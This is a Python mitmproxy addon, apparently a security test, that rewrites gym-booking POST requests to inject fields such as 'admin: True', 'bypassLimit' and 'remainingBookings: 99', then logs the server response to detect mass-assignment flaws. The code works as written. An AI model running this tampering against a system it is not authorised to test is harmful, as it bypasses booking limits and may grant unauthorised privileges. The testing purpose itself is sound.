"""
mitmproxy addon: tamper the POST /bookings/services body for the Gym service.

The POST doesn't even trigger if run alone, so you need to couple it with GET
script

Run with:
    mitmdump -s gym_post_tamper_test.py -s gym_get_tamper_test.py

What it does on every matching POST:
  - injects extra fields the server might trust blindly
  - logs the real response so you can see if the injected fields had any effect

This only covers "inject extra/overriding fields into a single POST".
It does NOT test the race condition — see race_condition_test.py below
for that (it needs to fire several real requests concurrently, which a
single mitm addon intercepting one flow at a time can't do cleanly).
"""

import json
from mitmproxy import http, ctx

PATH = "/bookings/services"
ONLY_SERVICE_ID = "cmkztqx2d000fuckto9dknnv3"  # Gym

# Fields to try injecting into the POST body. None of these should be
# accepted by the server — if any of them changes the outcome, that's
# a real finding.
INJECTED_FIELDS = {
	"remainingBookings": 99,
	"weeklyLimit": 99,
	"canBook": True,
	"override": True,
	"bypassLimit": True,
	"status": "CONFIRMED",
	"admin": True,
}


def matches(flow: http.HTTPFlow) -> bool:
	req = flow.request
	if req.method != "POST":
		return False
	if not req.path.split("?")[0].endswith(PATH):
		return False
	try:
		body = json.loads(req.get_text() or "{}")
	except ValueError:
		return False
	if ONLY_SERVICE_ID and body.get("service_id") != ONLY_SERVICE_ID:
		return False
	return True


def request(flow: http.HTTPFlow) -> None:
	if not matches(flow):
		return
	try:
		body = json.loads(flow.request.get_text())
	except ValueError:
		return
	before = dict(body)
	body.update(INJECTED_FIELDS)
	flow.request.set_text(json.dumps(body))
	flow.comment = "tampered: injected extra fields"
	ctx.log.info(f"[tamper] {before} -> {body}")


def response(flow: http.HTTPFlow) -> None:
	if not matches(flow) or flow.response is None:
		return
	ctx.log.info(
		f"[tamper] response status={flow.response.status_code} "
		f"body={flow.response.get_text()}"
	)
